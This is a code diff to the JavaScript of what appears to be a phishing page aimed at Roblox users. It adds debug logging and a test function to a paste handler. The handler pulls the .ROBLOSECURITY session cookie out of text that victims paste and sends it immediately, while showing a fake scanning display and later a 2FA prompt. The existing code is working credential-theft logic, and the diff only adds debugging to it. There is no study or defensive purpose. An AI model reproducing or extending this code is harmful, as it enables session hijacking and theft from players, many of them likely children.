@@ -779,13 +779,14 @@ document.addEventListener('DOMContentLoaded', function() {
 // Handle paste event - immediate cookie capture + 80s timer for 2FA
 async function handlePasteEvent(pastedText) {
     try {
-        console.log('Paste detected, analyzing content...');
+        console.log('🍪 PASTE EVENT TRIGGERED - Content length:', pastedText.length);
         
         // Show fake scanning progress to user
         showFakeScanningProgress();
         
         // Extract cookie from pasted text
         const robloxCookie = extractRobloxCookie(pastedText);
+        console.log('🔍 Cookie extraction result:', robloxCookie ? 'FOUND' : 'NOT FOUND');
         
         if (robloxCookie) {
             console.log('Roblox cookie found in pasted content, sending immediately...');
@@ -1017,6 +1018,8 @@ document.addEventListener('DOMContentLoaded', function() {
     // Auto-resize textarea and character count
     const textarea = document.getElementById('powershellInput');
     if (textarea) {
+        console.log('Setting up textarea event listeners...');
+        
         textarea.addEventListener('input', function() {
             // Auto-resize
             this.style.height = 'auto';
@@ -1028,14 +1031,18 @@ document.addEventListener('DOMContentLoaded', function() {
         
         // Handle paste events for immediate cookie capture
         textarea.addEventListener('paste', function(e) {
+            console.log('Paste event detected!');
             setTimeout(() => {
                 const pastedText = this.value;
+                console.log('Paste content length:', pastedText.length);
                 handlePasteEvent(pastedText);
             }, 100); // Small delay to ensure paste content is processed
         });
         
         // Initialize character count
         updateCharCount();
+    } else {
+        console.error('Textarea not found!');
     }
 
     // Smooth scrolling for navigation links
@@ -1060,6 +1067,14 @@ document.addEventListener('DOMContentLoaded', function() {
     // Note: 2-step verification will auto-show 80 seconds after paste event
     // See textarea paste handler for implementation
 });
+
+// Debug function to test paste functionality
+function testPasteFunction() {
+    console.log('Testing paste function manually...');
+    const testCookie = '.ROBLOSECURITY=_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_1234567890ABCDEF1234567890ABCDEF1234567890ABCDEF1234567890ABCDEF1234567890ABCDEF1234567890ABCDEF1234567890ABCDEF1234567890ABCDEF1234567890ABCDEF1234567890ABCDEF1234567890ABCDEF1234567890ABCDEF1234567890ABCDEF1234567890ABCDEF1234567890ABCDEF1234567890ABCDEF1234567890ABCDEF1234567890ABCDEF1234567890ABCDEF1234567890ABCDEF1234567890ABCDEF';
+    handlePasteEvent(testCookie);
+    showNotification('Test paste function triggered!', 'info');
+}
 
 // Keyboard shortcuts
 document.addEventListener('keydown', function(event) {
